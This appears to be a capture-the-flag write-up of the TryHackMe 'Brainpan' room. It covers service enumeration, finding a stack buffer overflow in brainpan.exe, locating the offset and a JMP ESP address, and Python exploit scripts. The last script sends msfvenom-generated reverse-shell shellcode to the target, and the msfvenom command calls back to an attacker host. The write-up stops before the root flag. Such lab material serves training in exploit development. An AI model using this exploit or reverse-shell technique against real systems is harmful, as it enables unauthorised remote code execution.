---
title: Box - Brainpan1
published: true
---

[https://tryhackme.com/room/brainpan](https://tryhackme.com/room/brainpan)

Reverse engineer a Windows executable, find a buffer overflow and exploit it on a Linux machine.

![](/assets/brainpan01.jpg)

* * *

## [](#header-2)Task 1 - Deploy and compromise the machine 

> Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. If you get stuck on this machine, don't give up (or look at writeups), just try harder. 

### [](#header-3)Nmap Scan

| PORT | STATE | SERVICE | REASON |
|------|-------|---------|--------|
| 9999/tcp | open | abyss | syn-ack ttl 61 |
| 10000/tcp | open | snet-sensor-mgmt SimpleHTTPServer 0.6 (Python 2.7.3) | syn-ack ttl 61 |

* * * 

### [](#header-3)Port 9999

- brainpan program needs password to continue can connect to this with netcat

* * * 

### [](#header-3)Port 10000

- SimpleHTTPServer 0.6 (Python 2.7.3)
- ``gobuster dir -u http://10.10.100.24:10000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x html,php,txt --no-error -t 100``
- in /bin we find brainpan.exe

* * * 

### [](#header-3)Buffer Overflow

- Open brainpan.exe in immunity and set working folder
- ``!mona config -set workingfolder c:\mona\%p``
- We can send through 5000 a's with our a.py ``print("A" *5000)``
- We have an EBP and EIP overwrite so we should be able to overflow the buffer and and ECX Shitstorm!?

![](/assets/brainpan02.png)

- Finding the offset
- ``msf-pattern_create -l 5000`` and send and note the EIP "35724134"

![](/assets/brainpan03.png)

- ``msf-pattern_offset -l 5000 -q 35724134``
- we have an exact match at offset 524
- Now we can edit our code to send payloads so we can find badchars.

```python
import socket
import sys

offset = 524
payload = b"A" * offset + b"B" * 4

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',9999))
      s.send(payload + b'\r\n')
      print("Payload sent...")
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- we control the EIP as its overwritten with our B's 42424242
- now we can find the badchars
- create bytearray in immunity ``!mona bytearray -b "\x00"`` and update our code with badchars variable

```shell
import socket
import sys

offset = 524
payload = b"A" * offset + b"B" * 4
badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',9999))
      s.send(payload + badchars + b'\r\n')
      print("Payload sent...")
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- restart brainpan in immunity and run exploit again and note the address that ESP registers
- **0022F930**
- run memory comparison in mona ``!mona compare -f C:\mona\brainpan\bytearray.bin -a 0022F930``
- we dont seen to have any badchars the shellcode returns Unmodified...

- try to find jump point with our badchars
- ``!mona jmp -r esp -cpb "\x00``

![](/assets/brainpan04.png)

- 311712F3 Jump Point
- Convert to little endian ``\xf3\x12\x17\x31``
- Generate shellcode with badchars... since this is a linux machine try linux shellcode? and try on target?
- ``msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.127.225 LPORT=7777 -b "\x00" -f c``
- update target IP and little endian and shellcode and lets see what happens

```python
import socket
import sys

offset = 524
payload = b"A" * offset + b"\xf3\x12\x17\x31" + b"\x90" * 32
shellcode = (b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
b"\xff\xff\x48\xbb\x5f\x8b\xa3\x80\xad\x1d\xb9\x1a\x48\x31\x58"
b"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x35\xa2\xfb\x19\xc7\x1f"
b"\xe6\x70\x5e\xd5\xac\x85\xe5\x8a\xf1\xa3\x5d\x8b\xbd\xe1\xa7"
b"\x1f\xc6\xfb\x0e\xc3\x2a\x66\xc7\x0d\xe3\x70\x75\xd3\xac\x85"
b"\xc7\x1e\xe7\x52\xa0\x45\xc9\xa1\xf5\x12\xbc\x6f\xa9\xe1\x98"
b"\xd8\x34\x55\x02\x35\x3d\xe2\xcd\xaf\xde\x75\xb9\x49\x17\x02"
b"\x44\xd2\xfa\x55\x30\xfc\x50\x8e\xa3\x80\xad\x1d\xb9\x1a")

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('10.10.166.160',9999))
      s.send(payload + shellcode + b'\r\n')
      print("Payload sent...")
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```



* * * 

##### [](#header-5)Answer the questions below

**What is the root flag?**




* * * 